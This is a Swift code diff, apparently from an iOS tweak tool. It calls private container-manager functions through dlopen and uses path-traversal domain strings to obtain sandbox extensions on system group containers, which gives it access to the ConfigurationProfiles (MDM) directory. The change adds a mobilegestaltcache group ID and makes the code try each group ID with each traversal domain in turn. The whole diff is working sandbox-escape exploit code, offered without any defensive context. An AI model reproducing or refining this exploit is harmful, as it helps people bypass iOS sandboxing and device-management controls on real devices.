@@ -34,7 +34,7 @@ private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type
 /// Try to activate a sandbox extension for the configurationprofiles SystemGroup.
 /// Verifies actual directory access via Darwin.open before returning.
 /// Returns TweakPaths.mdm_profiles on success, nil on failure.
-private func try_activate_mdm(lib: UnsafeMutableRawPointer, domain: String) -> String? {
+private func try_activate_mdm(lib: UnsafeMutableRawPointer, groupID: String = "systemgroup.com.apple.configurationprofiles", domain: String) -> String? {
     guard
         let create     = mdm_sym(lib, "container_query_create",                     as: mdm_create_fn.self),
         let activate   = mdm_sym(lib, "container_object_sandbox_extension_activate", as: mdm_activate_fn.self),
@@ -56,7 +56,7 @@ private func try_activate_mdm(lib: UnsafeMutableRawPointer, domain: String) -> S
     set_cls(q, 13)
     set_tran(q, false)
     let arr = xpc_array_create(nil, 0)
-    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.configurationprofiles")
+    xpc_array_set_string(arr, XPC_ARRAY_APPEND, groupID)
     set_gids(q, arr)
     set_plat(q, 2)
     set_flag(q, (1 << 32) | (1 << 39))
@@ -68,7 +68,7 @@ private func try_activate_mdm(lib: UnsafeMutableRawPointer, domain: String) -> S
 
     guard let res = get_res(q) else {
         free(q)
-        print("(mdm) [\(domain)] get_single_result returned nil")
+        print("(mdm) [\(groupID):\(domain)] get_single_result returned nil")
         return nil
     }
 
@@ -76,7 +76,7 @@ private func try_activate_mdm(lib: UnsafeMutableRawPointer, domain: String) -> S
     free(q)
 
     guard ok else {
-        print("(mdm) [\(domain)] activate returned false")
+        print("(mdm) [\(groupID):\(domain)] activate returned false")
         return nil
     }
 
@@ -87,16 +87,16 @@ private func try_activate_mdm(lib: UnsafeMutableRawPointer, domain: String) -> S
     let dirFd = targetPath.withCString { Darwin.open($0, O_RDONLY | O_DIRECTORY | O_CLOEXEC) }
     if dirFd >= 0 {
         Darwin.close(dirFd)
-        print("(mdm) [\(domain)] activation verified — ConfigurationProfiles is accessible")
+        print("(mdm) [\(groupID):\(domain)] activation verified — ConfigurationProfiles is accessible")
         return targetPath
     }
     let err = errno
-    print("(mdm) [\(domain)] activate succeeded but open(\(targetPath)) failed: \(String(cString: strerror(err))) (errno=\(err))")
+    print("(mdm) [\(groupID):\(domain)] activate succeeded but open(\(targetPath)) failed: \(String(cString: strerror(err))) (errno=\(err))")
     return nil
 }
 
 /// Activate a sandbox extension for the ConfigurationProfiles directory.
-/// Tries multiple domain strategies in order.
+/// Tries multiple domain strategies and group identifiers in order.
 func grant_mdm_access() -> String? {
     guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
         print("(mdm) dlopen failed")
@@ -104,15 +104,25 @@ func grant_mdm_access() -> String? {
     }
     defer { dlclose(lib) }
 
-    // Strategy 1: domain = "../ConfigurationProfiles" (up from Library/Caches to Library, into ConfigurationProfiles)
-    if let path = try_activate_mdm(lib: lib, domain: "../ConfigurationProfiles") { return path }
-
-    // Strategy 2: full path traversal like bad_query (8 levels up + absolute path)
     let fullDomain = "../../../../../../../../\(TweakPaths.mdm_profiles)"
-    if let path = try_activate_mdm(lib: lib, domain: fullDomain) { return path }
+    let groupIDs = [
+        "systemgroup.com.apple.mobilegestaltcache",
+        "systemgroup.com.apple.configurationprofiles"
+    ]
+    let domains = [
+        fullDomain,
+        "../ConfigurationProfiles",
+        ""
+    ]
 
-    // Strategy 3: no domain (activate whole container, might cover Library)
-    if let path = try_activate_mdm(lib: lib, domain: "") { return path }
+    for gID in groupIDs {
+        for d in domains {
+            if let path = try_activate_mdm(lib: lib, groupID: gID, domain: d) {
+                print("(mdm) Successfully activated access using groupID \(gID) and domain '\(d)'")
+                return path
+            }
+        }
+    }
 
     print("(mdm) all activation strategies failed")
     return nil
